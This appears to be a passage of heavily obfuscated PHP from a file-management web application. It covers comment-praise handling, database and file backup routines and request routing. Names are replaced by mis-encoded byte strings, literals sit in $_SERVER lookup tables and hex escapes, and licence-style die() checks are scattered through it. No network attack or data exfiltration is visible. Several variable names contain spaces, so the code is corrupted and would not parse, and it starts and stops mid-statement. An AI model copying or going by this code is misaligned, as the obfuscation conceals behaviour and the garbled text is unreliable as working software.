Model($œ∂ñ®ç∂[1833])->field($œ∂ñ®ç∂[1628])->where($•ãñâÓî)->limit(500)->select(); $à≠ñº«∏ = array_to_keyvalue($à≠ñº«∏, $œ∂ñ®ç∂[12], $œ∂ñ®ç∂[1628]); $©”∫Ê¸ª[$œ∂ñ®ç∂[1831]] = Model($œ∂ñ®ç∂[513])->userListInfo($à≠ñº«∏); return $©”∫Ê¸ª; } public function remove($’ÚÃ“•í) { $ÿ©ôˆîœ =& $_SERVER[ëæªã÷]; $÷ÁÅ¯·â = array($ÿ©ôˆîœ[1825] => $’ÚÃ“•í); $∫∑∏êÒû = $this->where($÷ÁÅ¯·â)->find(); if ($∫∑∏êÒû[$ÿ©ôˆîœ[1824]]) { $this->where(array($ÿ©ôˆîœ[1825] => $∫∑∏êÒû[$ÿ©ôˆîœ[1824]]))->setAdd($ÿ©ôˆîœ[1826], -1); } return $this->where($÷ÁÅ¯·â)->delete(); } public function edit($å‡‹∞¥ç, $Ÿî•ô ˝) { $ﬂ “—÷Ÿ =& $_SERVER[ëæªã÷]; $ÕíïñÑ = array($ﬂ “—÷Ÿ[1825] => $å‡‹∞¥ç); return $this->where($ÕíïñÑ)->save(array($ﬂ “—÷Ÿ[1834] => $Ÿî•ô ˝)); } public function prasise($∂õà©˘¡) { $íºı°…≈ =& $_SERVER[ëæªã÷]; $ΩÅœŸÖÍ = Model($íºı°…≈[1835]); $‚èƒùå = array($íºı°…≈[1825] => $∂õà©˘¡, $íºı°…≈[1619] => USER_ID); $à‡ïé„ñ = $ΩÅœŸÖÍ->where($‚èƒùå)->find(); if (!$à‡ïé„ñ) { $ΩÅœŸÖÍ->add($‚èƒùå); $◊ˆºÂ®Â = $this->where(array($íºı°…≈[1825] => $∂õà©˘¡))->setAdd($íºı°…≈[1827], 1); } else { $ΩÅœŸÖÍ->where($‚èƒùå)->delete(); $◊ˆºÂ®Â = $this->where(array($íºı°…≈[1825] => $∂õà©˘¡))->setAdd($íºı°…≈[1827], -1); } return $◊ˆºÂ®Â; } public function targetInfo($£Äªäˆ∑, $ÙÈÖÖ›Ç) { $ ƒÅ¬ÁÈ =& $_SERVER[ëæªã÷]; $·›—‚Ó· = array($ ƒÅ¬ÁÈ[580] => $£Äªäˆ∑, $ ƒÅ¬ÁÈ[581] => $ÙÈÖÖ›Ç); $î—·üò∆ = $this->where($·›—‚Ó·)->count(); $£°áäåë = "\x52\x49\x47\x48\x54\40\x4a\117\111\x4e\40{$this->tablePrefix}\143\157\155\155\145\156\164\x5f\160\x72\x61\x69\x73\x65\40\163\164\141\x72\x20\x6f\x6e\40\x63\x6f\155\x6d\145\156\x74\x2e\143\x6f\x6d\155\x65\156\x74\111\x44\x20\75\x20\163\x74\141\162\x2e\143\x6f\155\155\x65\156\164\111\104"; $”˙Ã˛ ˚ = $this->alias($ ƒÅ¬ÁÈ[358])->where($·›—‚Ó·)->join($£°áäåë, $ ƒÅ¬ÁÈ[1836])->count(); $ﬂÆº°ãŒ = array($ ƒÅ¬ÁÈ[1837] => $î—·üò∆, $ ƒÅ¬ÁÈ[1838] => $”˙Ã˛ ˚); return $ﬂÆº°ãŒ; } public function listData($Ñ¯¶£ëﬂ) { $”Ñß£ì¿ =& $_SERVER[ëæªã÷]; if (isset($Ñ¯¶£ëﬂ[$”Ñß£ì¿[1839]])) { if ($Ñ¯¶£ëﬂ[$”Ñß£ì¿[1839]]) { $Ñ¯¶£ëﬂ[$”Ñß£ì¿[1832]] = array($”Ñß£ì¿[990], intval($Ñ¯¶£ëﬂ[$”Ñß£ì¿[1839]])); } unset($Ñ¯¶£ëﬂ[$”Ñß£ì¿[1839]]); } if (isset($Ñ¯¶£ëﬂ[$”Ñß£ì¿[1840]])) { if ($Ñ¯¶£ëﬂ[$”Ñß£ì¿[1840]]) { $Ñ¯¶£ëﬂ[$”Ñß£ì¿[1832]] = array($”Ñß£ì¿[987], intval($Ñ¯¶£ëﬂ[$”Ñß£ì¿[1840]])); } unset($Ñ¯¶£ëﬂ[$”Ñß£ì¿[1840]]); } return $this->_listData($Ñ¯¶£ëﬂ); } private function _listData($ªïÆ«±ñ) { $õı˙–”ë =& $_SERVER[ëæªã÷]; $´ö◊Ê°¡ = $this->where($ªïÆ«±ñ)->_makeOrder()->selectPage(100); $this->_listAppendParent($´ö◊Ê°¡[$õı˙–”ë[373]]); $this->_listAppendUser($´ö◊Ê°¡[$õı˙–”ë[373]]); $this->_listAppendMeta($´ö◊Ê°¡[$õı˙–”ë[373]]); return $´ö◊Ê°¡; } private function _makeOrder() { $Æ®‚†“ =& $_SERVER[ëæªã÷]; $ﬁü˘¡à« = array($Æ®‚†“[1827], $Æ®‚†“[1826], $Æ®‚†“[203]); $æ˜ï∆≥¢ = Input::get($Æ®‚†“[455], $Æ®‚†“[7], $Æ®‚†“[424], $ﬁü˘¡à«); $Úøªúƒ∞ = Input::get($Æ®‚†“[456], $Æ®‚†“[7], $Æ®‚†“[1621], array($Æ®‚†“[1841], $Æ®‚†“[451])); $ºÂ¶»£é = $æ˜ï∆≥¢ . $Æ®‚†“[53] . $Úøªúƒ∞; return $this->order($ºÂ¶»£é); } private function _listAppendParent(&$Ü™≈á˜ﬁ) { $Ù§ïÊ˜± =& $_SERVER[ëæªã÷]; $ô⁄ºµòø = array_unique(array_to_keyvalue($Ü™≈á˜ﬁ, $Ù§ïÊ˜±[12], $Ù§ïÊ˜±[1824])); $ô⁄ºµòø = array_remove_value($ô⁄ºµòø, $Ù§ïÊ˜±[200]); if (!$ô⁄ºµòø) { return; } $ﬂ´ÏËÑœ = $this->where(array($Ù§ïÊ˜±[1825] => array($Ù§ïÊ˜±[7], $ô⁄ºµòø)))->select(); $ﬂ´ÏËÑœ = array_to_keyvalue($ﬂ´ÏËÑœ, $Ù§ïÊ˜±[1832]); foreach ($Ü™≈á˜ﬁ as &$πœ„–‹∂) { if (isset($ﬂ´ÏËÑœ[$πœ„–‹∂[$Ù§ïÊ˜±[1824]]])) { $πœ„–‹∂[$Ù§ïÊ˜±[1842]] = $ﬂ´ÏËÑœ[$πœ„–‹∂[$Ù§ïÊ˜±[1824]]]; } } unset($πœ„–‹∂); } private function _listAppendUser(&$◊û´µñ£) { $∆€¯‡¥è =& $_SERVER[ëæªã÷]; $¬Äû¶Ã™ = array_unique(array_to_keyvalue($◊û´µñ£, $∆€¯‡¥è[12], $∆€¯‡¥è[1628])); $¬Äû¶Ã™ = array_remove_value($¬Äû¶Ã™, $∆€¯‡¥è[200]); if (count($¬Äû¶Ã™) == 0) { return; } foreach ($◊û´µñ£ as $⁄‰¸‘Î) { if (isset($⁄‰¸‘Î[$∆€¯‡¥è[1842]])) { $¬Äû¶Ã™[] = $⁄‰¸‘Î[$∆€¯‡¥è[1842]][$∆€¯‡¥è[1628]]; } } $‡Ü∏âñ® = Model($∆€¯‡¥è[538])->userListInfo($¬Äû¶Ã™); foreach ($◊û´µñ£ as &$⁄‰¸‘Î) { $⁄‰¸‘Î[$∆€¯‡¥è[594]] = $‡Ü∏âñ®[$⁄‰¸‘Î[$∆€¯‡¥è[1628]]]; if (isset($⁄‰¸‘Î[$∆€¯‡¥è[1842]])) { $⁄‰¸‘Î[$∆€¯‡¥è[1842]][$∆€¯‡¥è[594]] = $‡Ü∏âñ®[$⁄‰¸‘Î[$∆€¯‡¥è[1842]][$∆€¯‡¥è[1628]]]; } } unset($⁄‰¸‘Î); } private function _listAppendMeta(&$¸áõ¸Ω„) { $ç˜Ê¶≠∏ =& $_SERVER[ëæªã÷]; $√ÔÅ©œï = array_unique(array_to_keyvalue($¸áõ¸Ω„, $ç˜Ê¶≠∏[12], $ç˜Ê¶≠∏[1832])); $√ÔÅ©œï = array_remove_value($√ÔÅ©œï, $ç˜Ê¶≠∏[200]); if (!$√ÔÅ©œï) { return; } foreach ($¸áõ¸Ω„ as $⁄˝›©™ﬂ) { if (isset($⁄˝›©™ﬂ[$ç˜Ê¶≠∏[1842]])) { $√ÔÅ©œï[] = $⁄˝›©™ﬂ[$ç˜Ê¶≠∏[1842]][$ç˜Ê¶≠∏[1832]]; } } $¶€˝õè¢ = $this->metaList($√ÔÅ©œï); if (!$¶€˝õè¢) { return !1; } foreach ($¸áõ¸Ω„ as &$⁄˝›©™ﬂ) { $⁄˝›©™ﬂ[$ç˜Ê¶≠∏[465]] = $¶€˝õè¢[$⁄˝›©™ﬂ[$ç˜Ê¶≠∏[1832]]]; if (isset($⁄˝›©™ﬂ[$ç˜Ê¶≠∏[1842]])) { $⁄˝›©™ﬂ[$ç˜Ê¶≠∏[1842]][$ç˜Ê¶≠∏[465]] = $¶€˝õè¢[$⁄˝›©™ﬂ[$ç˜Ê¶≠∏[1842]][$ç˜Ê¶≠∏[1832]]]; } } unset($⁄˝›©™ﬂ); } private function metaList($ô≠îÁÍ ) { $ˆÒºΩé =& $_SERVER[ëæªã÷]; if (!$ô≠îÁÍ ) { return array(); } $≥Òò‘„‚ = array($ˆÒºΩé[1832] => array($ˆÒºΩé[7], $ô≠îÁÍ )); $¯ÔÆæ¨à = Model($ˆÒºΩé[1843])->where($≥Òò‘„‚)->select(); $¯ÔÆæ¨à = array_to_keyvalue_group($¯ÔÆæ¨à, $ˆÒºΩé[1832]); foreach ($¯ÔÆæ¨à as $ä”ŒÔç¿ => $ Ú⁄ÍΩ˛) { $â√ç∆ç© = array(); foreach ($ Ú⁄ÍΩ˛ as $Î˝Ë∂≤«) { $â√ç∆ç©[$Î˝Ë∂≤«[$ˆÒºΩé[105]]] = $Î˝Ë∂≤«[$ˆÒºΩé[378]]; } $¯ÔÆæ¨à[$ä”ŒÔç¿] = $â√ç∆ç©; } return $¯ÔÆæ¨à ? $¯ÔÆæ¨à : array(); } } goto F≠©üﬁüæÂ; A¨°∑îÒ˜ç: class BackupDb { protected static $io; protected static $name; public function __construct() { } public function index() { $œˆ˜Ââó =& $_SERVER[ëæªã÷]; $Œ∏¸±»É = Backup::get(); self::$io = $Œ∏¸±»É[$œˆ˜Ââó[732]]; self::$name = $Œ∏¸±»É[$œˆ˜Ââó[32]]; $±ÆÛÇú˚ = new DbManage(); $ˆﬂÔµÉ = $±ÆÛÇú˚->dbType(); $√õ∆˘Ü† = array($œˆ˜Ââó[756] => $ˆﬂÔµÉ, $œˆ˜Ââó[757] => time()); Backup::set($√õ∆˘Ü†); $‹äÂ¯©Ì = $this->tmpFilesPath() . $œˆ˜Ââó[758] . self::$name . $œˆ˜Ââó[8]; del_dir($‹äÂ¯©Ì); mk_dir($‹äÂ¯©Ì); $ä ∂—Ïõ = $·°ëŸ–¿ = 0; $–⁄˜©í€ = new Task($œˆ˜Ââó[759], $œˆ˜Ââó[760], 0, LNG($œˆ˜Ââó[761]) . $œˆ˜Ââó[762] . LNG($œˆ˜Ââó[763])); try { $ùôº√åÚ = $±ÆÛÇú˚->db()->getTables(); } catch (Exception $∫Õò÷⁄û) { $–⁄˜©í€->end(); return !1; } $ùôº√åÚ = array_diff($ùôº√åÚ, array($œˆ˜Ââó[764], $œˆ˜Ââó[765])); foreach ($ùôº√åÚ as $∂ùÙô¡˛) { $ä ∂—Ïõ += $±ÆÛÇú˚->model($∂ùÙô¡˛)->count(); } $–⁄˜©í€->task[$œˆ˜Ââó[766]] = $ä ∂—Ïõ; $GLOBALS[$œˆ˜Ââó[767]] = self::$name; foreach ($ùôº√åÚ as $∂ùÙô¡˛) { $∫æÎì∏ã = $‹äÂ¯©Ì . $∂ùÙô¡˛ . $œˆ˜Ââó[768]; $ü¡ó˝ß— = null; if ($∂ùÙô¡˛ == $œˆ˜Ââó[769] && (!isset($Œ∏¸±»É[$œˆ˜Ââó[735]]) || $Œ∏¸±»É[$œˆ˜Ââó[735]] == $œˆ˜Ââó[200])) { $ü¡ó˝ß— = self::$io; } $·°ëŸ–¿ += $±ÆÛÇú˚->sqlFromDb($∂ùÙô¡˛, $∫æÎì∏ã, $–⁄˜©í€, $ü¡ó˝ß—); } unset($GLOBALS[$œˆ˜Ââó[767]]); $–⁄˜©í€->end(); if ($·°ëŸ–¿ > $ä ∂—Ïõ) { $ä ∂—Ïõ = $·°ëŸ–¿; } $√õ∆˘Ü† = array($œˆ˜Ââó[756] => $ˆﬂÔµÉ, $œˆ˜Ââó[753] => 1, $œˆ˜Ââó[770] => $ä ∂—Ïõ, $œˆ˜Ââó[771] => $·°ëŸ–¿, $œˆ˜Ââó[772] => time()); Backup::set($√õ∆˘Ü†); if ($ä ∂—Ïõ - $·°ëŸ–¿ > 0) { $ê»ÀØ§ß = $œˆ˜Ââó[773]; if (stristr(I18n::getType(), $œˆ˜Ââó[774])) { $ê»ÀØ§ß = $œˆ˜Ââó[775]; } write_log(array($ê»ÀØ§ß, $√õ∆˘Ü†), $œˆ˜Ââó[760]); return !1; } return !0; } private function tmpFilesPath() { $œÓƒøﬁÏ =& $_SERVER[ëæªã÷]; $—©ÕØåÑ = TEMP_FILES; if ($GLOBALS[$œÓƒøﬁÏ[6]][$œÓƒøﬁÏ[100]][$œÓƒøﬁÏ[776]]) { $—©ÕØåÑ = $GLOBALS[$œÓƒøﬁÏ[6]][$œÓƒøﬁÏ[100]][$œÓƒøﬁÏ[776]]; if (!mk_dir($—©ÕØåÑ) || !is_writable($—©ÕØåÑ) || !IO::mkfile($—©ÕØåÑ . $œÓƒøﬁÏ[777])) { $—©ÕØåÑ = TEMP_FILES; } } return $—©ÕØåÑ; } } class BackupDbFile { public function __construct() { } public function index() { $Àä‰ƒ’¶ =& $_SERVER[ëæªã÷]; $ÿ†¢•µÂ = Backup::get(); $–ûéÀØÛ = $ÿ†¢•µÂ[$Àä‰ƒ’¶[32]]; $ÂÔ´óõê = $this->tmpFilesPath() . "\142\141\x63\x6b\165\160\x5f{$–ûéÀØÛ}\x2f"; $äÚÑ‡˚ƒ = $this->backupPath($ÿ†¢•µÂ); if (!($äÚÑ‡˚ƒ = IO::mkdir($äÚÑ‡˚ƒ))) { return !1; } $¥◊∏ê ÿ = IO::listPath($ÂÔ´óõê); $–Ûà‹Œô = isset($¥◊∏ê ÿ[$Àä‰ƒ’¶[86]]) ? $¥◊∏ê ÿ[$Àä‰ƒ’¶[86]] : array(); $å¿é‡óø = array_sum(array_column($–Ûà‹Œô, $Àä‰ƒ’¶[90])); if (!$å¿é‡óø) { return !1; } $úŸíπ·˚ = array($Àä‰ƒ’¶[778] => $å¿é‡óø, $Àä‰ƒ’¶[779] => time()); Backup::set($úŸíπ·˚); $∫´ß°åﬁ = new TaskFileTransfer($Àä‰ƒ’¶[780], $Àä‰ƒ’¶[760], count($–Ûà‹Œô), LNG($Àä‰ƒ’¶[761]) . $Àä‰ƒ’¶[460] . LNG($Àä‰ƒ’¶[763]) . $Àä‰ƒ’¶[781]); $∫´ß°åﬁ->task[$Àä‰ƒ’¶[743]] = $å¿é‡óø; foreach ($¥◊∏ê ÿ[$Àä‰ƒ’¶[86]] as $¶Ûë—ƒ‡) { $Ï≥πÒ¸ = IO::move($¶Ûë—ƒ‡[$Àä‰ƒ’¶[88]], $äÚÑ‡˚ƒ); if (!$Ï≥πÒ¸) { $∫´ß°åﬁ->end(); $„ùœŸüè = IO::getLastError($Àä‰ƒ’¶[782] . $¶Ûë—ƒ‡[$Àä‰ƒ’¶[88]] . $Àä‰ƒ’¶[783] . $äÚÑ‡˚ƒ . $Àä‰ƒ’¶[536]); write_log($„ùœŸüè, $Àä‰ƒ’¶[760]); return !1; } } $‹ΩŒµ∂Œ = new DbManage(); $›®∆èöË = $‹ΩŒµ∂Œ->getSqlFile(); if (!$›®∆èöË[$Àä‰ƒ’¶[784]] || !$›®∆èöË[$Àä‰ƒ’¶[13]]) { return !1; } IO::move($›®∆èöË[$Àä‰ƒ’¶[784]], $äÚÑ‡˚ƒ); IO::move($›®∆èöË[$Àä‰ƒ’¶[13]], $äÚÑ‡˚ƒ); $∫´ß°åﬁ->end(); $úŸíπ·˚ = array($Àä‰ƒ’¶[785] => $å¿é‡óø, $Àä‰ƒ’¶[786] => time()); Backup::set($úŸíπ·˚); return !0; } private function backupPath($êÃÆÙ˜Ü) { $ÄØÁØä’ =& $_SERVER[ëæªã÷]; $˚Ù¬ñ◊Ò = $êÃÆÙ˜Ü[$ÄØÁØä’[32]]; $ã•®¶–‘ = Model($ÄØÁØä’[750])->get($ÄØÁØä’[751]); $á∫ïüïÄ = substr(md5($ÄØÁØä’[752] . $ã•®¶–‘ . $˚Ù¬ñ◊Ò), 0, 8); return "\x7b\x69\x6f\x3a{$êÃÆÙ˜Ü[$ÄØÁØä’[732]]}\x7d\57\x64\x61\x74\141\x62\x61\x73\145\57\142\x61\x63\x6b\x75\160\57" . $˚Ù¬ñ◊Ò . $ÄØÁØä’[11] . $á∫ïüïÄ; } private function tmpFilesPath() { $Æ∑Ë¡„ñ =& $_SERVER[ëæªã÷]; $Õ¶õöÅ∆ = TEMP_FILES; if ($GLOBALS[$Æ∑Ë¡„ñ[6]][$Æ∑Ë¡„ñ[100]][$Æ∑Ë¡„ñ[776]]) { $Õ¶õöÅ∆ = $GLOBALS[$Æ∑Ë¡„ñ[6]][$Æ∑Ë¡„ñ[100]][$Æ∑Ë¡„ñ[776]]; if (!mk_dir($Õ¶õöÅ∆) || !is_writable($Õ¶õöÅ∆) || !IO::mkfile($Õ¶õöÅ∆ . $Æ∑Ë¡„ñ[777])) { $Õ¶õöÅ∆ = TEMP_FILES; } } return $Õ¶õöÅ∆; } } class BackupFile { public function __construct() { } public function index() { $›åÒˆ©¿ = Backup::get(); $»Áˆ˘ﬂÒ = $›åÒˆ©¿[$_SERVER[ëæªã÷][297]][$_SERVER[ëæªã÷][202]][$_SERVER[ëæªã÷][467]]; $°“äøØ = array($_SERVER[ëæªã÷][468] => array($_SERVER[ëæªã÷][787], $»Áˆ˘ﬂÒ), $_SERVER[ëæªã÷][788] => array($_SERVER[ëæªã÷][335], $›åÒˆ©¿[$_SERVER[ëæªã÷][732]])); $±ú⁄ﬂ¸› = (int) Model($_SERVER[ëæªã÷][769])->where($°“äøØ)->count($_SERVER[ëæªã÷][467]); $¯„öÌ≤À = (int) Model($_SERVER[ëæªã÷][769])->where($°“äøØ)->sum($_SERVER[ëæªã÷][90]); $Òö”ÕÀë = new TaskFileTransfer($_SERVER[ëæªã÷][789], $_SERVER[ëæªã÷][760], $±ú⁄ﬂ¸›, LNG($_SERVER[ëæªã÷][761]) . $_SERVER[ëæªã÷][762] . LNG($_SERVER[ëæªã÷][790])); $Òö”ÕÀë->task[$_SERVER[ëæªã÷][743]] = $¯„öÌ≤À; $éˆäÄ°ƒ = array($_SERVER[ëæªã÷][791] => $±ú⁄ﬂ¸›, $_SERVER[ëæªã÷][792] => $¯„öÌ≤À, $_SERVER[ëæªã÷][793] => time()); Backup::set($éˆäÄ°ƒ); $‚é∑ÓÎÅ = !0; $àé«ò⁄æ = $this->storeIds(); $áÅøê¿‹ = 1; $Ú«ıÇ˛π = 1000; $°Äªÿûµ = $‚»÷Ì¶› = 0; $ˆÍ≠ßªí = array(); $¥…¢µ∞⁄ = $‡çûáÕ£ = 0; do { $Œø¥Œ©ë = $_SERVER[ëæªã÷][794]; $ÙÕ˛Ê„¥ = Model($_SERVER[ëæªã÷][769])->where($°“äøØ)->field($Œø¥Œ©ë)->order($_SERVER[ëæªã÷][795])->selectPage($Ú«ıÇ˛π, $áÅøê¿‹); $µÓú∞Ö¬ = !empty($ÙÕ˛Ê„¥[$_SERVER[ëæªã÷][373]]) ? $ÙÕ˛Ê„¥[$_SERVER[ëæªã÷][373]] : array(); foreach ($µÓú∞Ö¬ as $é“Ñ‚»É) { if (!$this->_fileExist($é“Ñ‚»É, $ˆÍ≠ßªí, $àé«ò⁄æ)) { $±ú⁄ﬂ¸› -= 1; $¯„öÌ≤À -= (int) $é“Ñ‚»É[$_SERVER[ëæªã÷][90]]; write_log("\146\151\154\x65\x20\156\157\x74\40\x65\170\x69\163\x74\x2e\146\x69\x6c\x65\111\x44\72{$é“Ñ‚»É[$_SERVER[ëæªã÷][467]]}\54\40\x70\141\164\150\x3a{$é“Ñ‚»É[$_SERVER[ëæªã÷][88]]}", $_SERVER[ëæªã÷][796]); continue; } $˜Ç‹∞ ﬂ = $é“Ñ‚»É[$_SERVER[ëæªã÷][88]]; $Œ±ùÌÕı = "\173\x69\x6f\72{$›åÒˆ©¿[$_SERVER[ëæªã÷][732]]}\175" . substr($˜Ç‹∞ ﬂ, strlen("\x7b\151\x6f\72{$é“Ñ‚»É[$_SERVER[ëæªã÷][797]]}\175")); if (IO::exist($Œ±ùÌÕı)) { $Òö”ÕÀë->updateFileEnd($é“Ñ‚»É[$_SERVER[ëæªã÷][32]], $é“Ñ‚»É[$_SERVER[ëæªã÷][90]]); } else { $Œ±ùÌÕı = get_path_father($Œ±ùÌÕı); IO::mkdir($Œ±ùÌÕı); if (!IO::copy($˜Ç‹∞ ﬂ, $Œ±ùÌÕı, $_SERVER[ëæªã÷][798])) { write_log($_SERVER[ëæªã÷][799] . $˜Ç‹∞ ﬂ . $_SERVER[ëæªã÷][783] . $Œ±ùÌÕı . $_SERVER[ëæªã÷][536], $_SERVER[ëæªã÷][760]); $‚é∑ÓÎÅ = !1; break; } } $»Áˆ˘ﬂÒ = $é“Ñ‚»É[$_SERVER[ëæªã÷][467]]; $‚»÷Ì¶› += 1; $°Äªÿûµ += $é“Ñ‚»É[$_SERVER[ëæªã÷][90]]; $‡çûáÕ£ += 1; $¥…¢µ∞⁄ += $é“Ñ‚»É[$_SERVER[ëæªã÷][90]]; if ($°Äªÿûµ >= 1024 * 1024 * 100) { $éˆäÄ°ƒ = array($_SERVER[ëæªã÷][800] => $»Áˆ˘ﬂÒ, $_SERVER[ëæªã÷][801] => $‡çûáÕ£, $_SERVER[ëæªã÷][802] => $¥…¢µ∞⁄); Backup::set($éˆäÄ°ƒ); $°Äªÿûµ = $‚»÷Ì¶› = 0; } } $Éº“âÓ˝ = count($µÓú∞Ö¬); $áÅøê¿‹++; } while ($Éº“âÓ˝ == $Ú«ıÇ˛π); $Òö”ÕÀë->end(); $éˆäÄ°ƒ = array($_SERVER[ëæªã÷][803] => 1, $_SERVER[ëæªã÷][496] => time(), $_SERVER[ëæªã÷][755] => 1, $_SERVER[ëæªã÷][800] => $»Áˆ˘ﬂÒ, $_SERVER[ëæªã÷][792] => $¯„öÌ≤À, $_SERVER[ëæªã÷][791] => $±ú⁄ﬂ¸›, $_SERVER[ëæªã÷][804] => time()); if ($‚»÷Ì¶›) { $éˆäÄ°ƒ[$_SERVER[ëæªã÷][801]] = $‡çûáÕ£; $éˆäÄ°ƒ[$_SERVER[ëæªã÷][802]] = $¥…¢µ∞⁄; } Backup::set($éˆäÄ°ƒ); $this->_fileFilter($ˆÍ≠ßªí); return !0; } private function _fileExist($ô´≥˘Ù°, &$ˆ¿ æ—Ù, $ìÔ◊Ä–Ó) { $ØâΩ˘Áî =& $_SERVER[ëæªã÷]; $ß•Ù”ˆÉ = $ô´≥˘Ù°[$ØâΩ˘Áî[88]]; if (in_array($ô´≥˘Ù°[$ØâΩ˘Áî[467]], $ˆ¿ æ—Ù)) { return !1; } if (!in_array($ô´≥˘Ù°[$ØâΩ˘Áî[797]], $ìÔ◊Ä–Ó)) { return !1; } if (IO::exist($ß•Ù”ˆÉ)) { return !0; } $Ä‘ı¿˘¿ = get_path_father($ß•Ù”ˆÉ); if (IO::exist($Ä‘ı¿˘¿)) { $ˆ¿ æ—Ù[] = $ô´≥˘Ù°[$ØâΩ˘Áî[467]]; return !1; } $ñˆë†ª¸ = array($ØâΩ˘Áî[797] => $ô´≥˘Ù°[$ØâΩ˘Áî[797]], $ØâΩ˘Áî[88] => array($ØâΩ˘Áî[387], "{$Ä‘ı¿˘¿}\45")); $∫⁄Å´©ª = Model($ØâΩ˘Áî[769])->where($ñˆë†ª¸)->field($ØâΩ˘Áî[468])->select(); $ˆ¿ æ—Ù = array_merge($ˆ¿ æ—Ù, array_to_keyvalue($∫⁄Å´©ª, $ØâΩ˘Áî[12], $ØâΩ˘Áî[467])); return !1; } private function _fileFilter($ â“ΩäÇ) { $‚µØ–∆‘ =& $_SERVER[ëæªã÷]; if (empty($ â“ΩäÇ)) { return; } $∏ﬂ›¿ØŒ = array($‚µØ–∆‘[467] => array($‚µØ–∆‘[7], array_unique($ â“ΩäÇ))); $ãâá‚≤π = Model($‚µØ–∆‘[805])->where($∏ﬂ›¿ØŒ)->field($‚µØ–∆‘[403])->select(); foreach ($ãâá‚≤π as $¸‚ì◊ËÁ) { Model($‚µØ–∆‘[805])->remove($¸‚ì◊ËÁ[$‚µØ–∆‘[403]], !1); } } private function storeIds() { $ˆ÷ØÛ˘ò =& $_SERVER[ëæªã÷]; $À‡Òú… = Model($ˆ÷ØÛ˘ò[747])->listData(); $ÅÖàé‰ƒ = array(); $âπö É– = $GLOBALS[$ˆ÷ØÛ˘ò[6]][$ˆ÷ØÛ˘ò[100]][$ˆ÷ØÛ˘ò[806]]; foreach ($À‡Òú… as $∂∏°üñâ) { $à˝∂Ωºæ = strtolower($∂∏°üñâ[$ˆ÷ØÛ˘ò[106]]); if (!isset($âπö É–[$à˝∂Ωºæ])) { continue; } $ûæ∏Ï›‡ = $ˆ÷ØÛ˘ò[84] . (isset($âπö É–[$à˝∂Ωºæ]) ? $âπö É–[$à˝∂Ωºæ] : ucfirst($à˝∂Ωºæ)); if (!class_exists($ûæ∏Ï›‡)) { continue; } $ÅÖàé‰ƒ[] = $∂∏°üñâ[$ˆ÷ØÛ˘ò[401]]; } return $ÅÖàé‰ƒ; } } goto aæﬁÕƒ„„À; F¥≤èÕπí–: if (!$olwqijtnvp) { return; } class Application { private $defaultModule = "\x69\x6e\x64\x65\170"; private $defaultController = "\x69\x6e\144\x65\170"; private $defaultAction = "\151\x6e\144\145\x78"; function __construct() { } public function setDefault($“ëæõ∏¢) { $ﬁñı÷≤˘ =& $_SERVER[µÁ∏◊Ÿ•]; $ÀŒ˙óÿî = explode($ﬁñı÷≤˘[0], trim($“ëæõ∏¢, $ﬁñı÷≤˘[0])); $this->defaultModule = $ÀŒ˙óÿî[0] ? $ÀŒ˙óÿî[0] : $this->defaultModule; $this->defaultController = $ÀŒ˙óÿî[1] ? $ÀŒ˙óÿî[1] : $this->defaultController; $this->defaultAction = $ÀŒ˙óÿî[2] ? $ÀŒ˙óÿî[2] : $this->defaultAction; $this->waxud5e2c77f($ﬁñı÷≤˘[1], array($this, $ﬁñı÷≤˘[2])); $‘ãÏ·∞‡ = $_SERVER[ëæªã÷][611]; } public function appRun($Õƒñ€ﬁã) { $ÄÂ∂ß‰ì =& $_SERVER[ëæªã÷]; $œéÉÆèË =& $_SERVER[µÁ∏◊Ÿ•]; $©Ñ¯√Å¢ = explode($œéÉÆèË[0], $Õƒñ€ﬁã); $°ÿàÄ„¨ = $ÄÂ∂ß‰ì[612]; if (strlen($°ÿàÄ„¨) < $ÄÂ∂ß‰ì[607]) { die; } $¿ôù‹ã‡ = strtolower($©Ñ¯√Å¢[0]); $”≤◊¸∆û = $ÄÂ∂ß‰ì[613]; if (strlen($”≤◊¸∆û) < $ÄÂ∂ß‰ì[66]) { die; } $Ñ‡∆≠ﬁö = $œéÉÆèË[3]; if ($¿ôù‹ã‡ == $œéÉÆèË[4]) { $Ñ‡∆≠ﬁö = $œéÉÆèË[5]; $©Ñ¯√Å¢[0] = $œéÉÆèË[6]; $©Ñ¯√Å¢[1] = $©Ñ¯√Å¢[1] . $œéÉÆèË[7]; $Õƒñ€ﬁã = join($œéÉÆèË[0], $©Ñ¯√Å¢); $Õƒñ€ﬁã = trim($Õƒñ€ﬁã, $œéÉÆèË[0]); } call_user_func(array($œéÉÆèË[8], $œéÉÆèË[9]), $Ñ‡∆≠ﬁö . $œéÉÆèË[10], $Õƒñ€ﬁã); ActionCall($Õƒñ€ﬁã); $Àû öÌ§ = $ÄÂ∂ß‰ì[614]; if (strlen($Àû öÌ§) < $ÄÂ∂ß‰ì[615]) { die; } call_user_func(array($œéÉÆèË[8], $œéÉÆèË[9]), $Ñ‡∆≠ﬁö . $œéÉÆèË[11], $Õƒñ€ﬁã); } private function autorun() { $Ã¯ïóö =& $_SERVER[µÁ∏◊Ÿ•]; global $config; if (count($config[$Ã¯ïóö[12]]) == 0) { return; } foreach ($config[$Ã¯ïóö[12]] as $∫ê’¨äﬂ => $∂¥Ã¶â) { $this->appRun($∂¥Ã¶â); $ﬁ◊Ù◊ïÆ = $_SERVER[ëæªã÷][616]; if (!$ﬁ◊Ù◊ïÆ) { die; } } } private function ufib35307385() { $¢„∫ù≥ö =& $_SERVER[ëæªã÷]; $ƒÇ“∆™‚ =& $_SERVER[µÁ∏◊Ÿ•]; $ó≥◊ÉÌ∂ = $ƒÇ“∆™‚[4]; $ﬁ›≤º¬ì = $¢„∫ù≥ö[617]; $§ˆæ¶›® = $GLOBALS[$ƒÇ“∆™‚[13]][$ƒÇ“∆™‚[14]][0]; if (!$§ˆæ¶›® || strlen($§ˆæ¶›®) <= strlen($ó≥◊ÉÌ∂)) { return; } if (strtolower(substr($§ˆæ¶›®, -strlen($ó≥◊ÉÌ∂))) != $ó≥◊ÉÌ∂) { return; } $‡‘ôÛ≈ú = substr($§ˆæ¶›®, 0, -strlen($ó≥◊ÉÌ∂)); $êè∞™¡ç = $¢„∫ù≥ö[618]; if (strlen($êè∞™¡ç) < $¢„∫ù≥ö[619]) { return; } $ÎÖ•∫ú∏ = array($ƒÇ“∆™‚[4], $‡‘ôÛ≈ú); $µéŒ‰Öô = array_slice($GLOBALS[$ƒÇ“∆™‚[13]][$ƒÇ“∆™‚[14]], 1); $GLOBALS[$ƒÇ“∆™‚[13]][$ƒÇ“∆™‚[14]] = array_merge($ÎÖ•∫ú∏, 